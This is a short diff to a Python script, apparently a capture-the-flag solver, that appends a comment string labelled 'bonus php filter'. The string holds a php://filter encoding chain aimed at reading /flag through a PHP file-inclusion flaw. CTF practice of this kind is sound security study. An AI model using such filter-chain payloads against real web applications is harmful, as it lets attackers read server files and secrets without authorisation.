@@ -38,3 +38,7 @@ def main():
 
 
 main()
+'''
+bonus php filter
+php://filter/read=convert.base64-encode|convert.base64-encode|string.tolower|string.rot13|convert.base64-encode|string.tolower|string.toupper|convert.base64-decode/resource=/flag
+'''
